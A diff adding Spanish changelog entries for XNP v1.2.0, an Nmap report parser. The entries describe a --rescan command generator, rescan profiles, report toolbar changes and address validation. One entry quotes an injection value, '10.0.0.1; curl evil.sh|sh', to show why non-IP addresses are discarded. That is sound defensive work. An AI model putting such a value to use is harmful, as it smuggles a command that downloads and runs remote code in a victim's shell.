@@ -6,6 +6,48 @@ Versiones publicadas de [XNP](https://github.com/xtormin/XtremeNmapParser).
 
 ## XNP v1.2.0 — el informe HTML
 
+- **Nuevo `--rescan`: el comando de nmap para la siguiente pasada, construido a
+  partir de lo que encontró esta.** Un escaneo terminado ya sabe qué hosts están
+  vivos y qué puertos tienen abiertos, así que `xnp -d nmap/ --rescan` imprime
+  los comandos que apuntan exactamente a eso en vez de volver a barrer hosts
+  enteros. Como nmap aplica una única lista de puertos a todos los objetivos de
+  la invocación, los hosts se agrupan **por firma de puertos**: los que tienen
+  el mismo conjunto de puertos abiertos comparten comando, y a ninguno se le
+  manda un puerto que no tiene. La lista de puertos, los tipos de escaneo y `-6`
+  se deciden por grupo, así que un grupo UDP lleva `-sU` y prefijos `U:`, uno
+  mixto lleva además un tipo TCP explícito (sin él, nmap ignora la mitad `T:`) y
+  a uno solo TCP se le deja el comportamiento por defecto de nmap salvo que el
+  perfil pidiera otro. `--rescan-args="…"` sustituye los argumentos por
+  completo. Los comandos van a stderr, así que stdout sigue siendo la lista
+  limpia de rutas generadas.
+- Los perfiles viven en `config.yaml`, en un bloque `rescan:` nuevo: `service`,
+  `vuln`, `recheck` y `full` vienen de serie, y uno añadido en
+  `config/config.yaml` se suma a ellos en lugar de reemplazar el bloque.
+  `states` decide a qué estados de puerto merece la pena apuntar; incluye
+  `open|filtered` por defecto, que es el estado normal de un puerto UDP y justo
+  lo que resuelve una segunda pasada corta.
+- **El botón `nmap` del informe ya genera comandos que funcionan.** Antes emitía
+  una única línea cartesiana —todos los puertos del grupo contra todos sus
+  hosts—, que sondeaba puertos que la mayoría de esos hosts no tenía, e ignoraba
+  el protocolo por completo, así que un grupo UDP salía sin `-sU` y con sus
+  puertos etiquetados como TCP. Ahora usa el mismo generador que `--rescan`.
+- **Un control de reescaneo en la barra de herramientas de las pestañas
+  Servicios y Datos**, junto al botón de entrega que cada una ya tenía, con un
+  selector de perfil que se llena desde tu `config.yaml` y una caja de texto
+  para escribir los argumentos a mano. Copia los comandos de la selección
+  actual —todo, o lo que haya dejado el filtro— y el número de la etiqueta
+  sigue al filtro en vivo, así que ves cómo `service:ssh` convierte siete
+  comandos en uno antes de pulsar.
+- **La ayuda del lenguaje de consulta está detrás de un botón de información**
+  junto a *Limpiar*, en vez de ocupar un párrafo bajo el buscador en todas las
+  pestañas para siempre. La elección se recuerda.
+- El pie enlaza al proyecto en GitHub.
+- Las direcciones se validan antes de llegar a una línea de comandos. `addr` es
+  CDATA en `nmap.dtd`, así que un informe que declare
+  `addr="10.0.0.1; curl evil.sh|sh"` es válido — y estos comandos están hechos
+  para pegarse en una shell. Lo que no sea una dirección IP se descarta en vez
+  de escaparse, tanto en Python como en JavaScript.
+
 - **Una carpeta se fusiona y se recorre entera por defecto.** `xnp -d nmap/` es
   el comando completo: `-M` y `-R` ya no hacen falta (se siguen aceptando, así
   que los scripts de siempre funcionan igual) y los nuevos `--no-merger` /
